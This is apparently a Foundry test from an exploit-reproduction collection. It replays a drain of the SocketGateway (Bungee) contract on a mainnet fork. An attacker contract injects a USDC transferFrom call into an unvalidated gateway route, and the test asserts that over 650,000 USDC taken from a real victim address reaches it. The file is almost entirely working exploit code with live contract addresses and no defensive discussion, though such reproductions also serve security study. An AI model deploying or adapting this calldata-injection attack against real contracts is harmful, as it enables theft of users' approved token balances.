// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

contract BungeeAttacker {
    IERC20 private constant USDC_TOKEN = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address private constant SOCKET_GATEWAY = 0x3a23F943181408EAC424116Af7b7790c94Cb97a5;
    address private constant NATIVE_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function exploit(
        address victim
    ) external {
        bytes memory injectedCall =
            abi.encodeCall(IERC20.transferFrom, (victim, address(this), USDC_TOKEN.balanceOf(victim)));

        bytes memory routeCall = abi.encodeWithSelector(
            bytes4(0x7899f9ed),
            address(USDC_TOKEN),
            NATIVE_TOKEN,
            0,
            address(this),
            bytes32(uint256(0x1b3b)),
            injectedCall
        );

        // SocketGateway dispatches route 0x196 by delegatecall. The vulnerable
        // route forwards injectedCall to USDC without validating its contents.
        (bool success,) = SOCKET_GATEWAY.call(abi.encodePacked(bytes4(uint32(0x196)), routeCall));
        require(success, "route call failed");
    }

    fallback() external payable {}
}

contract BungeeExploitTest is Test {
    IERC20 private constant USDC_TOKEN = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address private constant VICTIM = 0x7d03149A2843E4200f07e858d6c0216806Ca4242;

    function testExploit() public {
        vm.createSelectFork("https://eth.drpc.org", 19_021_453);

        BungeeAttacker attacker = new BungeeAttacker();
        attacker.exploit(VICTIM);

        assertGt(USDC_TOKEN.balanceOf(address(attacker)), 650_000e6);
    }
}
